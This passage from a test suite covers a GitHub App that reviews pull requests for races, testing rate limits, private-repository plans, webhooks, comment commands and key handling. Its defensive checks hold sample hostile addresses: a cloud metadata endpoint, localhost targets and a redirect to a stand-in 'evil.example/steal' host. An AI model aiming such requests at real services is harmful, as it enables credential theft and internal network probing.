    const gh = fakeGithub({
      answer: (c) => {
        // while the first pass lists the runs, another event for the same pull request arrives
        if (c.path.endsWith("/actions/runs") && mark) void mark();
        return undefined;
      },
    });
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    let marked = false;
    mark = async () => {
      if (marked) return;
      marked = true;
      await env.DB!.prepare("UPDATE github_prs SET pending = 1 WHERE repo_id = ? AND number = 12").bind(REPO.id).run();
    };
    gh.pulls.set(`${REPO.full_name}#12`, pullEvent("opened", 12, SHA1).pull_request);
    await pullRequest(env, gh, "opened", 12, SHA1);
    // two passes: the second one fetched the pull request itself instead of trusting the first event's copy
    expect(gh.calls.filter((c) => c.path.endsWith("/actions/runs"))).toHaveLength(2);
    expect(gh.calls.filter((c) => c.path === "/repos/acme/shop/pulls/12")).toHaveLength(1);
    expect(gh.checksAt(SHA1)).toHaveLength(1);
  });

  it("GitHub's rate limit ends the job quietly and nothing more is asked until the time GitHub named", async () => {
    const { env } = githubSetup();
    let limited = true;
    const gh = fakeGithub({ answer: (c) => (limited && c.path.endsWith("/actions/runs") ? new Response(JSON.stringify({ message: "API rate limit exceeded for installation." }), { status: 403, headers: { "x-ratelimit-remaining": "0", "x-ratelimit-reset": String(Math.floor(now().getTime() / 1000) + 600) } }) : undefined) });
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    const r = await pullRequest(env, gh, "opened", 12, SHA1);
    expect(r.status).toBe(502);
    expect(await result(r)).toBe("failed: rate_limited");
    expect(limitedFor(`i${INSTALLATION}`, now().getTime())).toBeGreaterThan(now().getTime());
    limited = false;
    const before = gh.calls.length;
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA1))).toBe("failed: rate_limited");
    expect(gh.calls.length).toBe(before);
    advance(601_000);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA1))).toBe("no race files");
  });

  it("a secondary limit without a time backs off a minute; an installation's hourly budget stops reviews, not the hour after", async () => {
    const { env, sql } = githubSetup();
    let abuse = true;
    const gh = fakeGithub({ answer: (c) => (abuse && c.method === "POST" && c.path.endsWith("/check-runs") ? new Response(JSON.stringify({ message: "You have exceeded a secondary rate limit." }), { status: 403 }) : undefined) });
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("failed: rate_limited");
    abuse = false;
    advance(30_000);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA1))).toBe("failed: rate_limited");
    advance(31_000);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA1))).toBe("no race files");

    sql.db.prepare("UPDATE github_usage SET reviews = ?").run(REVIEWS_PER_HOUR);
    const before = gh.calls.length;
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("over the hourly budget");
    expect(gh.calls.length).toBe(before);
    advance(3_600_000);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("no race files");
  });

  it("an artifact that is too large, corrupt or full of other things is noted, never trusted", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub();
    await pullRequest(env, gh, "opened", 12, SHA1);
    const big = new Uint8Array(5 * 1024 * 1024);
    const run = gh.addRun(SHA1, { "genclass-big": big, "genclass-corrupt": new TextEncoder().encode("this is not a zip archive at all"), "genclass-races": racesZip() });
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    const body = gh.summary(12)!;
    expect(body).toContain("Note: The artifact \"genclass-big\" is larger than this review reads (4 MB)");
    expect(body).toContain("Note: The artifact \"genclass-corrupt\" could not be opened");
    expect(body).toContain("**2 findings**");
    // the oversized one was never downloaded
    expect(gh.storage).toHaveLength(2);
  });

  it("an artifact's address is followed only to a public https host, and never with the token", async () => {
    for (const bad of ["http://169.254.169.254/latest/meta-data/", "https://10.0.0.8/a.zip", "https://localhost/a.zip", "http://127.0.0.1:9/a.zip", "https://user:pw@storage.example/a.zip", "ftp://storage.example/a.zip", "/relative/a.zip"]) expect(publicDownloadUrl(bad), bad).toBeNull();
    expect(publicDownloadUrl("https://productionresults.blob.core.windows.net/x/a.zip?sig=abc")).toBe("https://productionresults.blob.core.windows.net/x/a.zip?sig=abc");
    const { env } = githubSetup();
    const elsewhere: string[] = [];
    const gh = fakeGithub({ answer: (c) => (c.path.endsWith("/zip") ? new Response(null, { status: 302, headers: { location: "http://169.254.169.254/latest/meta-data/" } }) : undefined) });
    const fetch: typeof gh.fetch = async (u, i) => {
      if (!u.startsWith(API) && !u.startsWith(STORAGE)) elsewhere.push(u);
      return gh.fetch(u, i);
    };
    await pullRequest(env, { ...gh, fetch }, "opened", 12, SHA1);
    const run = gh.addRun(SHA1);
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch }))).toBe("no race files");
    expect(elsewhere).toEqual([]);
    expect(gh.storage).toEqual([]);
    expect(gh.checksAt(SHA1)[0].output.summary).toContain('Note: The artifact "genclass-races" could not be downloaded.');
  });

  it("a moved repository's redirect is followed inside GitHub's API and nowhere else", async () => {
    const { env } = githubSetup();
    let moved = true;
    const gh = fakeGithub({
      answer: (c, url) => (moved && c.path === "/repos/acme/shop/actions/runs" ? new Response(null, { status: 301, headers: { location: `${API}/repos/acme/shop/actions/runs?moved=1&${url.searchParams}` } }) : undefined),
    });
    // the first request is redirected, the second (the same path, at the address GitHub named) is answered
    const seen: string[] = [];
    const fetch: typeof gh.fetch = async (u, i) => {
      seen.push(u);
      if (u.includes("moved=1")) moved = false;
      const r = await gh.fetch(u, i);
      if (u.includes("moved=1")) moved = true;
      return r;
    };
    expect(await result(await pullRequest(env, { ...gh, fetch }, "opened", 12, SHA1))).toBe("no race files");
    expect(seen.filter((u) => u.includes("/actions/runs"))).toHaveLength(2);
    // a redirect that leaves the API is an error: the token is not sent after it
    const out = githubSetup();
    const g2 = fakeGithub({ answer: (c) => (c.path === "/repos/acme/shop/actions/runs" ? new Response(null, { status: 302, headers: { location: "https://evil.example/steal" } }) : undefined) });
    const went: string[] = [];
    const f2: typeof g2.fetch = async (u, i) => {
      went.push(u);
      return g2.fetch(u, i);
    };
    expect(await result(await pullRequest(out.env, { ...g2, fetch: f2 }, "opened", 12, SHA1))).toBe("failed: unexpected");
    expect(went.some((u) => u.includes("evil.example"))).toBe(false);
  });

  it("the daily sweep drops handled delivery ids after a week, hourly counts after two days and closed pull requests after a month", async () => {
    const { env, gh, sql } = await reviewed();
    await pullRequest(env, gh, "closed", 12, SHA1, { state: "closed" });
    await githubRetention(env.DB!, now());
    expect(sql.rows("SELECT COUNT(*) AS n FROM github_deliveries")[0]!.n).toBeGreaterThan(0);
    expect(sql.rows("SELECT COUNT(*) AS n FROM github_prs")[0]!.n).toBe(1);
    advance(8 * 86_400_000);
    await githubRetention(env.DB!, now());
    expect(sql.rows("SELECT * FROM github_deliveries")).toEqual([]);
    expect(sql.rows("SELECT * FROM github_usage")).toEqual([]);
    expect(sql.rows("SELECT COUNT(*) AS n FROM github_prs")[0]!.n).toBe(1);
    advance(23 * 86_400_000);
    await githubRetention(env.DB!, now());
    expect(sql.rows("SELECT * FROM github_prs")).toEqual([]);
    expect(await prRow(env.DB!, REPO.id, 12)).toBeNull();
  });
});

describe("github app: private repositories", () => {
  const PRIVATE = { ...REPO, id: 7002, name: "vault", full_name: "acme/vault", private: true };
  const openPr = (env: Parameters<typeof deliver>[0], gh: ReturnType<typeof fakeGithub>) => pullRequest(env, gh, "opened", 3, SHA1, { head: { sha: SHA1, ref: "f", repo: { id: PRIVATE.id } }, base: { ref: "main", repo: { id: PRIVATE.id } } }, PRIVATE);

  it("without a plan nothing of a private repository is read: one neutral check says why, and its test runs start nothing", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub();
    gh.repos.set(PRIVATE.full_name, PRIVATE.id);
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    expect(await result(await openPr(env, gh))).toBe("private repository without a plan");
    expect(gh.calls.map((c) => `${c.method} ${c.path}`)).toEqual([`POST /app/installations/${INSTALLATION}/access_tokens`, "POST /repos/acme/vault/check-runs"]);
    const check = [...gh.checks.values()][0];
    expect(check.output.title).toBe("Private repositories need a plan");
    expect(check.output.summary).toContain("nothing was read and nothing is posted here");
    const run = gh.addRun(SHA1, undefined, {}, PRIVATE.full_name);
    const before = gh.calls.length;
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1, {}, PRIVATE), { fetch: gh.fetch }))).toBe("private repository without a plan");
    expect(await result(await deliver(env, "issue_comment", commentEvent(3, "@genclass-dev review", {}, PRIVATE), { fetch: gh.fetch }))).toBe("private repository without a plan");
    expect(gh.calls.length).toBe(before);
    // the same event again does not write the same check again
    await openPr(env, gh);
    expect(gh.calls.filter((c) => c.path.endsWith("/check-runs"))).toHaveLength(1);
  });

  it("reviewed when the server is open, when the managing account's plan includes them, or with a paid Marketplace plan", async () => {
    const open = githubSetup({ GITHUB_APP_PRIVATE_REPOS: "open" });
    const g1 = fakeGithub();
    g1.repos.set(PRIVATE.full_name, PRIVATE.id);
    expect(await result(await openPr(open.env, g1))).toBe("no race files");

    const plan = githubSetup();
    const g2 = fakeGithub();
    g2.repos.set(PRIVATE.full_name, PRIVATE.id);
    await deliver(plan.env, "installation", installationCreated(), { fetch: g2.fetch });
    const me = await signedIn(plan.env);
    plan.sql.db.prepare("UPDATE github_installations SET owner = ?").run(me.account.id);
    expect(await result(await openPr(plan.env, g2))).toBe("private repository without a plan");
    // GenClass's own grant gives Enterprise, whose entitlements include private repositories
    setPlan(plan.sql, me.account.id, "free", { comp_until: new Date(now().getTime() + 86_400_000).toISOString() });
    expect(await result(await pullRequest(plan.env, g2, "synchronize", 3, SHA2, { head: { sha: SHA2, ref: "f", repo: { id: PRIVATE.id } } }, PRIVATE))).toBe("no race files");

    const market = githubSetup();
    const g3 = fakeGithub();
    g3.repos.set(PRIVATE.full_name, PRIVATE.id);
    const purchase = (action: string, cents: number) => ({ action, effective_date: "2026-10-13T00:00:00Z", marketplace_purchase: { account: { id: OWNER.id, login: OWNER.login, type: "Organization" }, plan: { id: 31, name: cents ? "Team" : "Open source", monthly_price_in_cents: cents }, unit_count: 1, on_free_trial: false, free_trial_ends_on: null } });
    expect(await result(await deliver(market.env, "marketplace_purchase", purchase("purchased", 0), { fetch: g3.fetch, path: "/api/github/marketplace" }))).toBe("purchased");
    expect(await result(await openPr(market.env, g3))).toBe("private repository without a plan");
    expect(await result(await deliver(market.env, "marketplace_purchase", purchase("changed", 2900), { fetch: g3.fetch, path: "/api/github/marketplace" }))).toBe("changed");
    expect(market.sql.rows("SELECT account_id, plan_name, monthly_cents FROM github_marketplace")).toEqual([{ account_id: OWNER.id, plan_name: "Team", monthly_cents: 2900 }]);
    expect(await result(await pullRequest(market.env, g3, "synchronize", 3, SHA2, { head: { sha: SHA2, ref: "f", repo: { id: PRIVATE.id } } }, PRIVATE))).toBe("no race files");
    expect(await result(await deliver(market.env, "marketplace_purchase", { ...purchase("pending_change", 0) }, { fetch: g3.fetch, path: "/api/github/marketplace" }))).toBe("pending change");
    expect(JSON.parse(String(market.sql.rows("SELECT pending FROM github_marketplace")[0]!.pending))).toMatchObject({ plan_id: 31 });
    expect(await result(await deliver(market.env, "marketplace_purchase", purchase("cancelled", 2900), { fetch: g3.fetch, path: "/api/github/marketplace" }))).toBe("cancelled");
    expect(market.sql.rows("SELECT * FROM github_marketplace")).toEqual([]);
  });

  it("each webhook takes only its own events, and the listing's webhook may have a secret of its own", async () => {
    const { env, sql } = githubSetup({ GITHUB_MARKETPLACE_WEBHOOK_SECRET: "marketplace-secret-0123456789" });
    const gh = fakeGithub();
    const purchase = { action: "purchased", marketplace_purchase: { account: { id: 1, login: "a" }, plan: { id: 2, name: "Team", monthly_price_in_cents: 100 } } };
    // signed with the app's secret, the listing's endpoint refuses it; the app's endpoint ignores the event
    expect((await deliver(env, "marketplace_purchase", purchase, { fetch: gh.fetch, path: "/api/github/marketplace" })).status).toBe(401);
    expect(await result(await deliver(env, "marketplace_purchase", purchase, { fetch: gh.fetch }))).toBe("ignored");
    expect(await result(await deliver(env, "pull_request", pullEvent("opened", 1, SHA1), { fetch: gh.fetch, path: "/api/github/marketplace", secret: "marketplace-secret-0123456789" }))).toBe("ignored");
    expect(sql.rows("SELECT * FROM github_marketplace")).toEqual([]);
    expect(await result(await deliver(env, "marketplace_purchase", purchase, { fetch: gh.fetch, path: "/api/github/marketplace", secret: "marketplace-secret-0123456789" }))).toBe("purchased");
    expect(sql.rows("SELECT login FROM github_marketplace")).toEqual([{ login: "a" }]);
    expect(WEBHOOK_SECRET).not.toBe("marketplace-secret-0123456789");
  });
});

describe("github app: commands in pull-request comments", () => {
  it("help, replay and a finding that does not exist: one reply each, with a reaction to show the command was seen", async () => {
    const { env, gh } = await reviewed();
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help", { id: 9001 }), { fetch: gh.fetch }))).toBe("help");
    expect(gh.reactions).toEqual([{ comment: 9001, content: "eyes" }]);
    expect(gh.posted(12)[1]).toContain("@genclass-dev replay <n>");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev replay 1"), { fetch: gh.fetch }))).toBe("replay");
    expect(gh.posted(12)[2]).toContain('`npx playwright test checkout.spec.ts -g "places one order" --repeat-each 2`');
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev replay 9"), { fetch: gh.fetch }))).toBe("no such finding");
    expect(gh.posted(12)[3]).toContain("There is no finding 9 on this pull request. Its findings are numbered 1, 2");
    // none of the replies is the summary comment, which is still the first one
    expect(gh.posted(12)[0]).toContain("## GenClass runtime review");
    expect(gh.posted(12)).toHaveLength(4);
  });

  it("who may command: collaborators; the author for review, replay and help; never a stranger, a bot, or the app itself", async () => {
    const { env, gh } = await reviewed();
    const count = () => gh.posted(12).length;
    const stranger = { user: { id: 666, login: "mallory", type: "User" }, association: "NONE" };
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help", stranger), { fetch: gh.fetch }))).toBe("not allowed");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev fix 1", { ...stranger, association: "CONTRIBUTOR" }), { fetch: gh.fetch }))).toBe("not allowed");
    // the pull request's author, without write access: help yes, fix and pause no
    const author = { user: { id: 77, login: "ada", type: "User" }, association: "CONTRIBUTOR" };
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help", author), { fetch: gh.fetch }))).toBe("help");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev pause", author), { fetch: gh.fetch }))).toBe("not allowed");
    // a member of the organization whose permission on this repository is read: GitHub is asked, and says no
    gh.permissions.set("bob", "read");
    const bob = { user: { id: 88, login: "bob", type: "User" }, association: "MEMBER" };
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev fix 1", bob), { fetch: gh.fetch }))).toBe("not allowed");
    expect(gh.calls.some((c) => c.path === "/repos/acme/shop/collaborators/bob/permission")).toBe(true);
    for (const bot of [{ id: 1, login: "genclass-dev[bot]", type: "Bot" }, { id: 2, login: "dependabot[bot]", type: "Bot" }, { id: 3, login: "sneaky[bot]", type: "User" }]) {
      expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help", { user: bot, association: "COLLABORATOR" }), { fetch: gh.fetch })), bot.login).toBe("bot");
    }
    expect(count()).toBe(2);
    // not a command, an edit, an issue that is not a pull request, a closed pull request
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "nice, could @genclass-dev review this?"), { fetch: gh.fetch }))).toBe("no command");
    expect(await result(await deliver(env, "issue_comment", { ...commentEvent(12, "@genclass-dev help"), action: "edited" }, { fetch: gh.fetch }))).toBe("ignored");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help", { issue: { pull_request: undefined } }), { fetch: gh.fetch }))).toBe("not a pull request");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev help", { issue: { state: "closed" } }), { fetch: gh.fetch }))).toBe("closed");
    expect(count()).toBe(2);
  });

  it("fix: a brief for a branch of this repository, asked for by someone with write access; never for a fork", async () => {
    const { env, gh } = await reviewed();
    gh.pulls.set(`${REPO.full_name}#12`, pullEvent("opened", 12, SHA1).pull_request);
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev fix 1"), { fetch: gh.fetch }))).toBe("fix brief");
    const brief = gh.posted(12)[1]!;
    expect(brief.startsWith("<!-- genclass-bot:fix-brief -->\n### Fix brief, finding 1\n")).toBe(true);
    expect(brief).toContain("Asked for by ada.");
    const json = JSON.parse(/```json\n([\s\S]*?)\n```/.exec(brief)![1]!);
    expect(json).toMatchObject({ schema: "genclass-brief/1", repository: "acme/shop", pull_request: 12, head_sha: SHA1, finding: { number: 1, operation: "POST /api/orders", reproducible: true } });
    // the same pull request, but its head is a fork's branch
    gh.pulls.set(`${REPO.full_name}#12`, pullEvent("opened", 12, SHA1, { head: { sha: SHA1, ref: "patch", repo: { id: 99001, full_name: "mallory/shop" } } }).pull_request);
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev fix 1"), { fetch: gh.fetch }))).toBe("fix refused for a fork");
    expect(gh.posted(12)[2]).toContain("A fix brief is only written for branches of this repository.");
    expect(gh.posted(12)[2]).not.toContain("genclass-bot:fix-brief");
  });

  it("pause and resume a pull request; review on request; issue on request; commands off", async () => {
    const { env, gh, sql } = await reviewed();
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev pause"), { fetch: gh.fetch }))).toBe("paused");
    expect(parseState(String(sql.rows("SELECT state FROM github_prs")[0]!.state)).paused).toBe(true);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("paused on this pull request");
    // asked for by a person, a review runs even while paused
    expect(gh.checksAt(SHA2)).toEqual([]);
    gh.addRun(SHA2);
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev review"), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev resume"), { fetch: gh.fetch }))).toBe("resumed");
    expect(parseState(String(sql.rows("SELECT state FROM github_prs")[0]!.state)).paused).toBe(false);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA3))).toBe("no race files");

    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev issue 2"), { fetch: gh.fetch }))).toBe("issue");
    expect(gh.issues).toHaveLength(1);
    expect(gh.issues[0]!.title).toBe("Stale response on GET /api/search (GenClass, from #12)");
    expect(gh.posted(12).at(-1)).toContain("Opened #301 for finding 2.");

    const off = await reviewed({}, "commands: false\n");
    expect(await result(await deliver(off.env, "issue_comment", commentEvent(12, "@genclass-dev help"), { fetch: off.gh.fetch }))).toBe("commands are off");
    expect(off.gh.posted(12)).toHaveLength(1);
    expect(off.gh.summary(12)).not.toContain("@genclass-dev replay 1");
  });
});

describe("github app: production findings of a linked app", () => {
  it("the linked app's findings on the pages the pull request's files serve are listed; the rest are counted", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    const me = await signedIn(env);
    const app = await createApp(env, me.cookie, "Shop");
    await sendBatch(env, app.token, [...detection("stale", "/checkout"), ...detection("duplicate", "/checkout"), ...detection("stale", "/admin/users")]);
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    sql.db.prepare("INSERT INTO github_repos (repo_id, installation_id, full_name, private, project_id, linked_by, linked, updated) VALUES (?, ?, ?, 0, ?, ?, ?, ?)").run(REPO.id, INSTALLATION, REPO.full_name, app.id, me.account.id, now().toISOString(), now().toISOString());
    gh.files.set(`${REPO.full_name}#12`, [
      { filename: "app/checkout/page.tsx", status: "modified", patch: "@@ -1 +1 @@\n-a\n+b" },
      { filename: "src/lib/cart.ts", status: "modified" },
      { filename: "app/old/page.tsx", status: "removed" },
    ]);
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("no race files");
    const body = gh.summary(12)!;
    expect(body).toContain("### In production: Shop, last 7 days");
    expect(body).toContain("| Detection, stale | `/checkout` | 1 | `app/checkout/page.tsx` |");
    expect(body).toContain("| Detection, duplicate | `/checkout` | 1 | `app/checkout/page.tsx` |");
    expect(body).toContain("1 more finding on 1 other page.");
    expect(body).not.toContain("/admin/users");
    expect(body).not.toContain("SECRET PAGE TEXT");
    expect(body).toContain(`[Open the dashboard](${ORIGIN}/account/apps/${app.id})`);
    // a pull request that touches no page route says so and lists nothing
    gh.files.set(`${REPO.full_name}#13`, [{ filename: "src/lib/cart.ts", status: "modified" }]);
    await pullRequest(env, gh, "opened", 13, SHA2);
    expect(gh.summary(13)).toBeNull();
    // production: false in the settings turns it off, and the files are not listed any more
    gh.settings.set(REPO.full_name, "production: false\n");
    advance(121_000);
    const before = gh.calls.length;
    await pullRequest(env, gh, "opened", 16, SHA3);
    expect(gh.calls.slice(before).some((c) => c.path.endsWith("/files"))).toBe(false);
    expect(gh.summary(16)).toBeNull();
  });

  it("deleting the app or the account takes the link away", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    const me = await signedIn(env);
    const app = await createApp(env, me.cookie, "Shop");
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    const link = () => sql.db.prepare("INSERT OR REPLACE INTO github_repos (repo_id, installation_id, full_name, private, project_id, linked_by, linked, updated) VALUES (?, ?, ?, 0, ?, ?, ?, ?)").run(REPO.id, INSTALLATION, REPO.full_name, app.id, me.account.id, now().toISOString(), now().toISOString());
    link();
    sql.db.prepare("UPDATE github_installations SET owner = ?").run(me.account.id);
    expect((await call(env, "DELETE", `/api/account/projects/${app.id}`, { cookie: me.cookie, body: { confirm: "delete" } })).status).toBe(204);
    expect(sql.rows("SELECT project_id, linked_by FROM github_repos")).toEqual([{ project_id: null, linked_by: null }]);
    const again = await createApp(env, me.cookie, "Shop 2");
    sql.db.prepare("UPDATE github_repos SET project_id = ?, linked_by = ?").run(again.id, me.account.id);
    expect((await call(env, "DELETE", "/api/account", { cookie: me.cookie, body: { confirm: "delete" } })).status).toBe(204);
    expect(sql.rows("SELECT project_id, linked_by FROM github_repos")).toEqual([{ project_id: null, linked_by: null }]);
    expect(sql.rows("SELECT owner FROM github_installations")).toEqual([{ owner: null }]);
  });
});

describe("github app: the key", () => {
  it("a PKCS#8 key works like the PKCS#1 key GitHub generates, and a broken key fails the job without leaking", async () => {
    const ok = githubSetup({ GITHUB_APP_PRIVATE_KEY: PRIVATE_KEY_PKCS8 });
    const gh = fakeGithub();
    expect(await result(await pullRequest(ok.env, gh, "opened", 12, SHA1))).toBe("no race files");
    const bad = githubSetup({ GITHUB_APP_PRIVATE_KEY: "-----BEGIN RSA PRIVATE KEY-----\nAAAA\n-----END RSA PRIVATE KEY-----" });
    const g2 = fakeGithub();
    const r = await pullRequest(bad.env, g2, "opened", 12, SHA1);
    expect(r.status).toBe(502);
    expect(await result(r)).toBe("failed: error");
    expect(g2.calls).toEqual([]);
    expect(API).toBe("https://api.github.com");
  });
});
